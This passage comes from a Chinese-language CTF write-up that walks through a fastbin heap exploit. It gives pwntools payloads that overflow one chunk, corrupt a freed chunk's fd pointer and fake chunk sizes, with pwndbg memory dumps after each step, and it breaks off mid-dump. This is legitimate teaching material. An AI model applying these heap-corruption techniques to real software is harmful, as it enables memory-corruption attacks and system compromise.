<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index2</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#index4</span><br></code></pre></td></tr></tbody></table></figure>
<p>执行完此payload之后的heap情况如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">50</span>gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> #index0<br><span class="hljs-number">0x555555757010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> #index1<br><span class="hljs-number">0x555555757030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> #index2<br><span class="hljs-number">0x555555757050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> #index3<br><span class="hljs-number">0x555555757070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000091</span> #index4<br>......（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020ef1</span> #top_chunk<br></code></pre></td></tr></tbody></table></figure>
<p>此时程序结构体中的情况：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x5fcead98720</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead98730</span>:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000010</span><br>    			#index0<br><span class="hljs-number">0x5fcead98740</span>:	<span class="hljs-number">0x0000555555757010</span>	<span class="hljs-number">0x0000000000000001</span><br>    								#index1<br><span class="hljs-number">0x5fcead98750</span>:	<span class="hljs-number">0x0000000000000010</span>	<span class="hljs-number">0x0000555555757030</span><br><span class="hljs-number">0x5fcead98760</span>:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000010</span><br>     			#index2<br><span class="hljs-number">0x5fcead98770</span>:	<span class="hljs-number">0x0000555555757050</span>	<span class="hljs-number">0x0000000000000001</span><br>    								#index3<br><span class="hljs-number">0x5fcead98780</span>:	<span class="hljs-number">0x0000000000000010</span>	<span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000080</span><br>    			#index4<br><span class="hljs-number">0x5fcead987a0</span>:	<span class="hljs-number">0x0000555555757090</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure>
<h4 id="1-3-free创建的index1和index2"><a href="#1-3-free创建的index1和index2" class="headerlink" title="1-3-free创建的index1和index2"></a>1-3 free创建的index1和index2</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#free两个,这时候会放到fastbins中,而且因为是后进的,所以</span><br><span class="hljs-comment">#fastbin[0]-&gt;index2-&gt;index1-&gt;NULL</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br></code></pre></td></tr></tbody></table></figure>
<p>执行此部分payload，来看一下堆状况：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:	<span class="hljs-number">0x0000555555757020</span>	<span class="hljs-number">0x0000000000000000</span><br>    			<span class="hljs-comment">#fd指针指向index1的起始地址</span><br><span class="hljs-number">0x555555757060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure>
<p>此时的bin和main_arena情况：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0000555555757020</span>-&gt;<span class="hljs-number">0x555555757040</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br><span class="hljs-built_in">all</span>: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000555555757040</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000555555757110</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure>
<p>程序的结构体状况如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x5fcead98730</span>:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000010</span><br>    			#index0<br><span class="hljs-number">0x5fcead98740</span>:	<span class="hljs-number">0x0000555555757010</span>	<span class="hljs-number">0x0000000000000000</span><br>    								#index1（chunk_flag置零）<br><span class="hljs-number">0x5fcead98750</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>                #chunk_content_size置零   #chunk_data_ptr置空     <br><span class="hljs-number">0x5fcead98760</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>     			#index2（chunk_flag置零）  #chunk_data_size置零     <br><span class="hljs-number">0x5fcead98770</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000001</span><br>    			#chunk_data_ptr置空  #index3<br><span class="hljs-number">0x5fcead98780</span>:	<span class="hljs-number">0x0000000000000010</span>	<span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000080</span><br>    			#index4<br><span class="hljs-number">0x5fcead987a0</span>:	<span class="hljs-number">0x0000555555757090</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure>
<h4 id="1-4-对-index0-进行-fill-操作，溢出修改-index2-和-fd-指针"><a href="#1-4-对-index0-进行-fill-操作，溢出修改-index2-和-fd-指针" class="headerlink" title="1-4-对-index0-进行-fill-操作，溢出修改-index2-和-fd-指针"></a>1-4 对 index0 进行 fill 操作，溢出修改 index2 和 fd 指针</h4>
<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>, payload)<br></code></pre></td></tr></tbody></table></figure>
<p>还记得上面提到的程序漏洞吗？<br>
第一次执行Allocate函数时chunk_content_size是我们指定的，但是fill的时候并没有将新的chunk_content_size写入到结构体中，并且之前alloc chunk时指定的堆块size大小没有发生改变，所以这里就出现了任意堆溢出的情形。<br>
这一小段payload的目的是：通过fill index0溢出修改index2的fd指针为index4的地址，此处的payload只用修改fd的最后一个字节为0x80即可。<br>
执行payload之后的内存空间如下：</p>
<blockquote>
<p>chunk2-&gt;fd已成功修改为chunk4的起始地址（这个起始地址是指向chunk header的）</p>
</blockquote>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>                <span class="hljs-comment">#payload从这里开始修改堆块内容</span><br><span class="hljs-number">0x555555757020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2（fastbin）</span><br><span class="hljs-number">0x555555757050</span>:	<span class="hljs-number">0x0000555555757080</span>	<span class="hljs-number">0x0000000000000000</span><br>    			<span class="hljs-comment">#此处的fd指针已经被修改</span><br>--------------------------------------------------------------    <br>执行payload前原来的内容为：<br><span class="hljs-number">0x555555757050</span>:	<span class="hljs-number">0x0000555555757020</span>	<span class="hljs-number">0x0000000000000000</span><br>--------------------------------------------------------------    <br><span class="hljs-number">0x555555757060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4（fastbin）</span><br><span class="hljs-number">0x555555757090</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br>pwndbg&gt;  <br></code></pre></td></tr></tbody></table></figure>
<h4 id="1-5-对-index3-进行fill操作，将-index4-的大小修改为-0x21"><a href="#1-5-对-index3-进行fill操作，将-index4-的大小修改为-0x21" class="headerlink" title="1-5-对-index3-进行fill操作，将-index4-的大小修改为-0x21"></a>1-5 对 index3 进行fill操作，将 index4 的大小修改为 0x21</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#然后再通过index3去进行写入,把index4的大小改成0x21</span><br><span class="hljs-comment">#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fastbin的范围内（请注意这点)</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x555555757000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2（fastbin）</span><br><span class="hljs-number">0x555555757050</span>:	<span class="hljs-number">0x0000555555757080</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index4（fastbin）</span><br>--------------------------------------------------------------    <br>执行payload前原来的内容为：<br><span class="hljs-number">0x555555757080</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4（fastbin）</span><br>-------------------------------------------------------------- <br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757180</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
<p>再次强调，在申请fastbin中内存时，会检查被释放堆块的size（大小）是否在fastbin的范围内，如果不在，程序则异常退出，这有关于fastbin的机制。结构体状况未发生改变。</p>
<h4 id="1-6-申请-index4"><a href="#1-6-申请-index4" class="headerlink" title="1-6-申请-index4"></a>1-6 申请 index4</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#改好index4的大小之后去申请两次，这样就把原来的fastbin中的给申请出来了</span><br>alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#申请成功之后index2就指向index4</span><br></code></pre></td></tr></tbody></table></figure>
<p>首先是两个malloc，前面fastbin里一开始是两个chunk，分别为index2-&gt;index1，后来我们修改index2-&gt;fd为index4的地址，fastbin里变为</p>
<p>index2-&gt;index4。第一个malloc会先分配index2给我们（fastbin分配原则是LIFO即后进先出），第二个malloc会将index4分配给我们。<br>
看一下堆：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757060</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x555555757080</span><br>Size: <span class="hljs-number">0x00</span><br><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
<p>此时的内存：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x555555757120</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757180</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
<p>此时的结构体状况：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000010</span><br>    			<span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:	<span class="hljs-number">0x0000555555757010</span>	<span class="hljs-number">0x0000000000000001</span><br>    								<span class="hljs-comment">#index1（chunk_flag改变）</span><br><span class="hljs-number">0x5fcead98750</span>:	<span class="hljs-number">0x0000000000000010</span>	<span class="hljs-number">0x0000555555757050</span><br>                <span class="hljs-comment">#chunk_content_size（改变）   #chunk_data_ptr（改变）     </span><br><span class="hljs-number">0x5fcead98760</span>:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000010</span><br>     			<span class="hljs-comment">#index2（chunk_flag改变）  #chunk_data_size（改变）     </span><br><span class="hljs-number">0x5fcead98770</span>:	<span class="hljs-number">0x0000555555757090</span>	<span class="hljs-number">0x0000000000000001</span><br>    			<span class="hljs-comment">#chunk_data_ptr（改变）  #index3</span><br><span class="hljs-number">0x5fcead98780</span>:	<span class="hljs-number">0x0000000000000010</span>	<span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000080</span><br>    			<span class="hljs-comment">#index4</span><br><span class="hljs-number">0x5fcead987a0</span>:	<span class="hljs-number">0x0000555555757090</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure>
<p>注意，此时我们有两个地方指向index4：<br>
<strong>index4的content指针</strong>（程序的正常指向）<br>
<strong>index2的content指针</strong> （通过执行payload中malloc之后的指向，参照上方代码框中的结构体）<br>
第二个malloc得到的是index为2的chunk，这与程序中的Allocate函数有关，可以回顾一下前面的IDA代码。<br>
也就是说假如我们现在要fill index2的内容，那么其实上是修改index4的内容。</p>
<h4 id="1-7-修改-index4-的-size-为0x91"><a href="#1-7-修改-index4-的-size-为0x91" class="headerlink" title="1-7-修改-index4-的-size-为0x91"></a>1-7 修改 index4 的 size 为0x91</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#为了让index4能够被放到unsortedbin中,要把它的大小改回来</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:	<span 